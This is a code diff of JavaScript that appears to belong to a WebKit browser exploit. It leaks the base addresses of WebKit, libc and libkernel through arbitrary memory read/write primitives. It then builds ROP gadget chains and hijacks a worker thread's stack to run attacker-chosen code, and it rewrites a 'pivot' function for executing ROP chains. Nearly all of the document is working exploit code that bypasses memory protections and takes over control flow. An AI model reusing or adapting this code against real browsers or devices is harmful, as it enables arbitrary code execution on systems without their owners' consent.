@@ -1,64 +1,52 @@
 var tarea = document.createElement('textarea');
+var vt_ptr = read_ptr_at(addrof(tarea)+0x18);
+var vtable = read_ptr_at(vt_ptr);
 
-var real_vt_ptr = read_ptr_at(addrof(tarea)+0x18);
-var fake_vt_ptr = malloc(0x400);
-write_mem(fake_vt_ptr, read_mem(real_vt_ptr, 0x400));
+var webkit_base = read_ptr_at(vtable) - 13649280;
+var libkernel_base = read_ptr_at(webkit_base + 0x28f9d70) - 0x33580;
+var libc_base = read_ptr_at(webkit_base + 0x28f9d38) - 0x148f0;
 
-var real_vtable = read_ptr_at(fake_vt_ptr);
-var fake_vtable = malloc(0x2000);
-write_mem(fake_vtable, read_mem(real_vtable, 0x2000));
-write_ptr_at(fake_vt_ptr, fake_vtable);
+var thread_list = libkernel_base + 0x601a8;
+var pivot_addr = libc_base + 0x4366e;
+var infloop_addr = webkit_base + 0x109e1;
 
-var fake_vt_ptr_bak = malloc(0x400);
-write_mem(fake_vt_ptr_bak, read_mem(fake_vt_ptr, 0x400));
-
-var plt_ptr = read_ptr_at(fake_vtable) - 17100888;
-
-function get_got_addr(idx)
+function find_worker()
 {
-    var p = plt_ptr + idx * 16;
-    var q = read_mem(p, 6);
-    if(q[0] != 0xff || q[1] != 0x25)
-        throw "invalid GOT entry";
-    var offset = 0;
-    for(var i = 5; i >= 2; i--)
-        offset = offset * 256 + q[i];
-    offset += p + 6;
-    return read_ptr_at(offset);
+    for(var i = read_ptr_at(thread_list); i; i = read_ptr_at(i + 0x38))
+        if(read_ptr_at(i + 0xb0) == 0x80000)
+            return read_ptr_at(i + 0xa8);
+    return 0;
 }
 
-//these are not real bases but rather some low addresses
-var webkit_base = read_ptr_at(fake_vtable) - 0x1000000;
-var libkernel_base = get_got_addr(1111);
-var libc_base = get_got_addr(21);
-var saveall_addr = libc_base+0x21944;
-var loadall_addr = libc_base+0x25e88;
-var pivot_addr = libc_base+0x25efe;
-var infloop_addr = libc_base+0x395c0;
-var jop_frame_addr = libc_base+0x661d0;
-var get_errno_addr_addr = libkernel_base+0xc480;
-var pthread_create_addr = libkernel_base+0x24e10;
+var spin_table = malloc(88);
 
-function saveall()
-{
-    var ans = malloc(0x800);
-    var bak = read_ptr_at(fake_vtable+0x1d8);
-    write_ptr_at(fake_vtable+0x1d8, saveall_addr);
-    write_ptr_at(addrof(tarea)+0x18, fake_vt_ptr);
-    tarea.scrollLeft = 0;
-    write_ptr_at(addrof(tarea)+0x18, real_vt_ptr);
-    write_mem(ans, read_mem(fake_vt_ptr, 0x400));
-    write_mem(fake_vt_ptr, read_mem(fake_vt_ptr_bak, 0x400));
-    var bak = read_ptr_at(fake_vtable+0x1d8);
-    write_ptr_at(fake_vtable+0x1d8, saveall_addr);
-    write_ptr_at(fake_vt_ptr+0x38, 0x1234);
-    write_ptr_at(addrof(tarea)+0x18, fake_vt_ptr);
-    tarea.scrollLeft = 0;
-    write_ptr_at(addrof(tarea)+0x18, real_vt_ptr);
-    write_mem(ans+0x400, read_mem(fake_vt_ptr, 0x400));
-    write_mem(fake_vt_ptr, read_mem(fake_vt_ptr_bak, 0x400));
-    return ans;
-}
+//set up rdi for returning
+write_ptr_at(spin_table, webkit_base+0x788fd); //pop rdi
+write_ptr_at(spin_table+8, spin_table-24); //32-56
+
+//loop waiting for commands
+write_ptr_at(spin_table+16, webkit_base+0x5d293); //pop rsp
+write_ptr_at(spin_table+24, spin_table+16); //will overwrite with the jump target
+
+//[rdi+56] is here on return
+write_ptr_at(spin_table+32, spin_table+40);
+write_ptr_at(spin_table+40, spin_table+24); //will be popped into rdi
+
+//restore the loop
+write_ptr_at(spin_table+48, webkit_base+0x84094); //pop rax
+write_ptr_at(spin_table+56, spin_table+16);
+write_ptr_at(spin_table+64, webkit_base+0x1254da); //mov [rdi], rax
+
+//loop
+write_ptr_at(spin_table+72, webkit_base+0x5d293); //pop rsp
+write_ptr_at(spin_table+80, spin_table);
+
+//hijack worker's control flow
+var worker_stack = find_worker();
+write_ptr_at(worker_stack+0x7fb88, webkit_base+0x5d293); //pop rsp
+write_ptr_at(worker_stack+0x7fb90, spin_table);
+
+the_worker.postMessage(1); //the worker is now busy in pop rsp loop
 
 /* PUBLIC ROP API
 
@@ -69,22 +57,7 @@ This function is used to execute ROP chains. `buf` is an address of the start of
 */
 function pivot(buf)
 {
-    var ans = malloc(0x400);
-    var bak = read_ptr_at(fake_vtable+0x1c8/*0x1d8*/);
-    write_ptr_at(fake_vtable+0x1c8/*0x1d8*/, saveall_addr);
-    //write_ptr_at(fake_vt_ptr, 1);
-    write_ptr_at(addrof(tarea)+0x18, fake_vt_ptr);
-    tarea.scrollLeft = 0;
-    write_ptr_at(addrof(tarea)+0x18, real_vt_ptr);
-    write_mem(ans, read_mem(fake_vt_ptr, 0x400));
-    write_mem(fake_vt_ptr, read_mem(fake_vt_ptr_bak, 0x400));
-    var bak = read_ptr_at(fake_vtable+0x1c8/*0x1d8*/);
-    write_ptr_at(fake_vtable+0x1c8/*0x1d8*/, pivot_addr);
-    write_ptr_at(fake_vt_ptr+0x38, buf);
-    write_ptr_at(ans+0x38, read_ptr_at(ans+0x38)-16);
-    write_ptr_at(buf, ans);
-    write_ptr_at(addrof(tarea)+0x18, fake_vt_ptr);
-    tarea.scrollLeft = 0;
-    write_ptr_at(addrof(tarea)+0x18, real_vt_ptr);
-    write_mem(fake_vt_ptr, read_mem(fake_vt_ptr_bak, 0x400));
+    write_ptr_at(buf, spin_table-24);
+    write_ptr_at(spin_table+24, buf+8);
+    while(read_ptr_at(spin_table+24) != spin_table+16);
 }
